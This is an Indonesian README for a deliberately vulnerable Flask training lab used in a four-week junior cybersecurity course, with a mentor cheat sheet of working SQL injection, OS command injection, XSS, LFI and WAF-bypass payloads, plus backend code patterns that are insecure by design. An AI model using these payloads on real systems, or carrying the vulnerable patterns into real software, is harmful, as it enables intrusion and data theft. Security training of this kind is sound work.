# 🛡️ CyberLab: Vulnerable Web Application (Fast Track 4 Minggu)

Aplikasi web laboratorium simulasi kerentanan keamanan (*vulnerable web application*) yang dibangun menggunakan **Python Flask** dan **SQLite**, dibungkus dalam arsitektur kontainer **Docker** dengan reverse proxy **Nginx**.

Lab ini dirancang khusus untuk memfasilitasi kurikulum mentoring teknis **Junior Cybersecurity Engineer (4 Minggu)** yang mencakup:
1. **Network Sniffing & Traffic Interception** (Port 80 Plaintext & Port 443 TLS)
2. **SQL Injection (SQLi)**: Authentication Bypass & UNION-Based Data Extraction
3. **Cross-Site Scripting (XSS)**: Reflected XSS & Stored XSS
4. **Local File Inclusion (LFI)**: Path Traversal & Source Code Disclosure
5. **OS Command Injection (RCE)**: Network Ping Diagnostics Tool
6. **Filter & WAF Bypass**: Teknik Evasion terhadap sanitasi input tidak sempurna

---

## 📁 Struktur Direktori

```text
├── app.py                     # Backend Flask & seluruh route lab kerentanan
├── init_db.py                 # Inisialisasi SQLite (vulnerable_lab.db), dummy data & flags
├── requirements.txt           # Dependensi Python (Flask, Gunicorn)
├── Dockerfile                 # Konfigurasi container backend Flask (iputils-ping, curl, gunicorn)
├── docker-compose.yml         # Orkestrasi Docker (Flask + Nginx Port 80 & 443)
├── .dockerignore
├── nginx/
│   ├── Dockerfile             # Nginx container dengan openssl
│   ├── default.conf           # Proxy konfig simultan Port 80 (HTTP) dan 443 (HTTPS)
│   └── entrypoint.sh          # Pembuat otomatis self-signed SSL certificate
├── sensitive_files/
│   ├── flag.txt               # Flag CTF target LFI
│   ├── server_config.bak      # Mock konfigurasi backup server (API keys, IP internal)
│   ├── company_policy.txt     # Dokumen kebijakan keamanan
│   └── about_portal.txt       # Dokumen standar portal
├── static/
│   └── css/style.css          # Tema cyber-dark modern (Bootstrap 5)
├── templates/
│   ├── base.html              # Layout utama & navigasi
│   ├── index.html             # Dashboard kurikulum & status lab
│   ├── sqli.html              # Lab SQL Injection (Login bypass & UNION)
│   ├── xss.html               # Lab XSS (Reflected & Stored)
│   ├── lfi.html               # Lab Local File Inclusion
│   ├── rce.html               # Lab OS Command Injection
│   ├── filter_bypass.html     # Lab WAF / Filter Evasion Playground
│   └── network_lab.html       # Panduan interaktif Wireshark & Burp Suite
└── README.md                  # Buku panduan mentor & cheat sheet solusi
```

---

## 🚀 Panduan Menjalankan Lab (Deployment)

### Opsi 1: Menjalankan via Docker Compose (Rekomendasi Utama)
Opsi ini akan menjalankan arsitektur lengkap dengan **Port 80 (HTTP)** dan **Port 443 (HTTPS)** secara simultan dengan sertifikat SSL yang dibuat secara otomatis.

1. Pastikan Docker Desktop telah berjalan di komputer.
2. Buka terminal di direktori proyek dan jalankan:
   ```bash
   docker-compose up -d --build
   ```
3. Akses aplikasi:
   - **HTTP Plaintext**: [http://localhost](http://localhost) (atau port 80)
   - **HTTPS Enkripsi**: [https://localhost](https://localhost) (atau port 443)

Untuk mematikan container:
```bash
docker-compose down
```

---

### Opsi 2: Menjalankan via Python Standalone (Tanpa Docker)
Jika peserta belum menginstal Docker, lab tetap dapat dijalankan langsung menggunakan interpreter Python lokal:

1. Buat virtual environment (opsional) dan instal dependensi:
   ```bash
   pip install -r requirements.txt
   ```
2. Inisialisasi database SQLite:
   ```bash
   python init_db.py
   ```
3. Jalankan aplikasi Flask:
   ```bash
   python app.py
   ```
4. Buka browser di [http://localhost:5000](http://localhost:5000).

---

## 🎯 Silabus Teknis 4 Minggu & Cheat Sheet Mentor

### Minggu 1: Network Sniffing & Traffic Interception (Port 80 vs 443)
* **Konsep Pokok**: Memahami risiko transmisi data tanpa enkripsi serta konsep Man-In-The-Middle (MITM).
* **Praktik Wireshark (Port 80)**:
  1. Buka Wireshark, pilih interface loopback atau network adapter aktif.
  2. Gunakan display filter: `http.request.method == "POST"`
  3. Kirim data login di menu **Module 6 (HTTP / HTTPS)**.
  4. Klik kanan paket `POST /network-lab/login-test` > **Follow > TCP Stream**.
  5. Peserta dapat melihat kredensial plaintext: `sniff_user=...&sniff_pass=...`.
* **Praktik Burp Suite (Port 443)**:
  1. Konfigurasi browser ke proxy Burp (`127.0.0.1:8080`).
  2. Buka `http://burp` > klik **CA Certificate** untuk mengunduh `cacert.der`.
  3. Impor sertifikat ke *Authorities / Trusted Root Certification Authorities* di browser.
  4. Akses `https://localhost:443` dan demonstrasikan inspeksi HTTPS request secara realtime.

---

### Minggu 2: Injection Attacks (SQLi & OS Command Injection)
* **SQL Injection - Authentication Bypass (`/sqli`)**:
  - Backend Query: `SELECT * FROM users WHERE username = '{username}' AND password = '{password}'`
  - Payload Dasar: `' OR 1=1 --`
  - Payload Admin Spesifik: `admin' --`
  - WAF Filter Bypass (jika switch WAF aktif): `admin' or '1'='1' --` (menggunakan huruf kecil `or` karena filter naif hanya memblokir kata kapital `OR`).
* **SQL Injection - UNION-Based Data Extraction (`/sqli/search`)**:
  - Cek jumlah kolom: `' ORDER BY 5 --` (Sukses), `' ORDER BY 6 --` (Error) -> Terbukti ada 5 kolom.
  - Cek mapping kolom: `' UNION SELECT 1, 2, 3, 4, 5 --`
  - Dumping skema database: `' UNION SELECT 1, tbl_name, 3, 4, sql FROM sqlite_master WHERE type='table' --`
  - Dumping data nasabah (Kartu Kredit):
    ```sql
    ' UNION SELECT id, full_name, email, credit_card, cvv FROM customers --
    ```
* **OS Command Injection (`/rce`)**:
  - Backend Command: `ping -c 2 {target}` (Linux) atau `ping -n 2 {target}` (Windows) via `shell=True`.
  - Payload Standar: `127.0.0.1; whoami` atau `127.0.0.1; id`
  - Payload Ekstraksi File: `127.0.0.1; cat /etc/passwd` atau `127.0.0.1 & dir`
  - WAF Bypass (jika filter memblokir `;` dan `&&`):
    - Menggunakan pipe operator: `127.0.0.1 | whoami`
    - Menggunakan conditional OR: `invalid_host || whoami`

---

### Minggu 3: Client-Side Attacks (Cross-Site Scripting / XSS)
* **Reflected XSS (`/xss/reflected`)**:
  - Parameter URL: `?q=<script>alert('XSS')</script>`
  - Bypass Filter Kasus Huruf: `<sCrIpt>alert(document.cookie)</sCrIpt>`
  - Bypass Event Handler (tanpa kata script): `<img src=x onerror=alert('Pwned')>` atau `<svg onload=alert(1)>`
* **Stored XSS (`/xss/stored`)**:
  - Masukkan nama analis sembarang, lalu pada isi komentar masukkan:
    ```html
    <script>alert('Stored XSS - Dieksekusi otomatis pada setiap refresh!')</script>
    ```
  - Disimpan ke database SQLite `comments` dan dieksekusi oleh setiap pengguna yang memuat halaman.
  - Untuk mereset komentar yang terinfeksi: klik tombol **Reset Komentar** atau akses `/xss/clear`.

---

### Minggu 4: File Inclusion & Defense Evasion
* **Local File Inclusion / Directory Traversal (`/lfi`)**:
  - Parameter URL: `/lfi?file=...`
  - Target 1 (Flag Rahasia): `/lfi?file=flag.txt` atau `/lfi?file=../sensitive_files/flag.txt`
  - Target 2 (Backup Kredensial Server): `/lfi?file=server_config.bak`
  - Target 3 (Source Code Aplikasi): `/lfi?file=../app.py`
  - Target 4 (File Sistem Linux di Docker): `/lfi?file=/etc/passwd`
* **Filter & WAF Bypass Playground (`/waf-bypass`)**:
  1. *Case Sensitivity*: Menggunakan campuran kapital (`<ScRiPt>alert(1)</sCrIpT>`).
  2. *Non-Recursive Replacement*: Menggunakan tag tersarang (`<scr<script>ipt>alert(1)</scr</script>ipt>`).
  3. *Incomplete Tag Blacklist*: Menggunakan tag alternatif (`<img src=x onerror=alert(1)>` atau `<svg onload=alert(1)>`).
  4. *Shell Separator Evasion*: Menggunakan operator pipa tunggal (`127.0.0.1 | whoami`) ketika `;` dan `&&` diblokir.

---

## 🔄 Mereset Database Lab
Jika selama sesi praktik database teracak-acak atau peserta ingin mengulang dari awal:
- Cukup klik tombol **Reset DB** di pojok kanan atas navbar portal (`/reset-db`), atau
- Jalankan di terminal: `python init_db.py`.
